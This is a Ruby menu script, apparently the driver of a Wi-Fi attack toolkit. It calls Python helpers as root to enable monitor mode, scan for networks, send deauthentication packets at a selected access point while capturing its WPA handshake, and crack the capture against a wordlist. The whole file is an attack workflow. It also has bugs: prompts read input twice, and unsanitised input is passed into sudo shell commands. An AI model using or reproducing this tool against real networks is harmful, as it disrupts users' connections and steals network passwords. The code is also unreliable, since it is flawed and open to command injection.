#!/usr/bin/env ruby
require 'json'
require 'fileutils'

# Configuration
CORE_DIR = File.expand_path('../core', __dir__)
WORDLISTS_DIR = File.expand_path('../wordlists', __dir__)
REPORTS_DIR = File.expand_path('../reports', __dir__)

def run_python(script, args)
  cmd = "sudo python3 #{File.join(CORE_DIR, script)} #{args}"
  # If output is expected to be JSON (like scanner/analyzer)
  if script.include?("scanner.py") || script.include?("analyzer.py")
    output = `#{cmd}`.strip
    begin
      return JSON.parse(output)
    rescue JSON::ParserError
      puts "Error parsing output from #{script}"
      return nil
    end
  else
    # System call (prints output directly)
    system(cmd)
    return nil
  end
end

def check_root
  if Process.uid != 0
    puts "[!] Please run with sudo."
    exit 1
  end
end

def banner
  puts <<-BANNER
   ___ _  _ ___ _  _      _   ___ ___ _  _ 
  / __| || | __| \| |___ /_\ | _ \_ _| \| |
 | (__| __ | _|| .` / -_) _ \|  _/| || .` |
  \___|_||_|___|_|\_\___|_/ \_\_| |___|_|\_|
  v2.0 - Modular Auditing Suite
  BANNER
end

# --- Menu Actions ---

def action_monitor(interface, start=true)
  check_root
  script = start ? "monitor.py" : "monitor.py"
  args = start ? "-i #{interface}" : "-i #{interface} --stop"
  run_python(script, args)
end

def action_scan(interface, time)
  check_root
  puts "[*] Scanning for #{time} seconds..."
  data = run_python("scanner.py", "-i #{interface} -t #{time}")
  
  if data
    puts "-" * 60
    printf "%-5s %-20s %-5s %s\n", "ID", "BSSID", "CH", "ESSID"
    puts "-" * 60
    data.each_with_index do |net, idx|
      printf "%-5s %-20s %-5s %s\n", idx+1, net['bssid'], net['channel'], net['essid']
    end
    return data
  end
  []
end

def action_attack(interface, target)
  check_root
  bssid = target['bssid']
  channel = target['channel']
  
  puts "[*] Starting capture on #{bssid}..."
  pid = fork do
    # Run capture in background
    run_python("capture.py", "-i #{interface} -b #{bssid} -c #{channel}")
  end
  
  sleep 5 # Let capture initialize
  
  puts "[*] Sending deauth packets..."
  run_python("deauth.py", "-i #{interface} -b #{bssid} -n 10")
  
  puts "[*] Waiting 20 seconds for handshake..."
  sleep 20
  
  Process.kill("TERM", pid)
  puts "[*] Attack finished. Check reports/ folder."
end

def action_crack(cap_file, wordlist)
  run_python("cracker.py", "-f #{cap_file} -w #{wordlist}")
end

# --- Main Loop ---

banner
puts "Options:"
puts "1. Set Monitor Mode"
puts "2. Scan Networks"
puts "3. Attack Target"
puts "4. Crack Handshake"
puts "5. Exit"

loop do
  print "\n[?] Select option > "
  choice = gets.chomp

  case choice
  when '1'
    print "Interface [wlan0]: "
    iface = gets.chomp.empty? ? "wlan0" : gets.chomp
    print "Start or Stop? (s/t): "
    action = gets.chomp
    action_monitor(iface, action == 's')
    
  when '2'
    print "Interface [wlan0mon]: "
    iface = gets.chomp.empty? ? "wlan0mon" : gets.chomp
    print "Scan time [15]: "
    time = gets.chomp.empty? ? 15 : gets.chomp.to_i
    $targets = action_scan(iface, time) # Store for later use
    
  when '3'
    if $targets.nil? || $targets.empty?
      puts "[!] Scan for networks first."
      next
    end
    print "Select target ID: "
    id = gets.chomp.to_i - 1
    target = $targets[id]
    
    print "Interface [wlan0mon]: "
    iface = gets.chomp.empty? ? "wlan0mon" : gets.chomp
    
    action_attack(iface, target)
    
  when '4'
    print "Path to .cap file: "
    cap = gets.chomp
    print "Path to wordlist: "
    wordlist = gets.chomp
    action_crack(cap, wordlist)
    
  when '5'
    puts "Exiting..."
    break
  else
    puts "Invalid option."
  end
end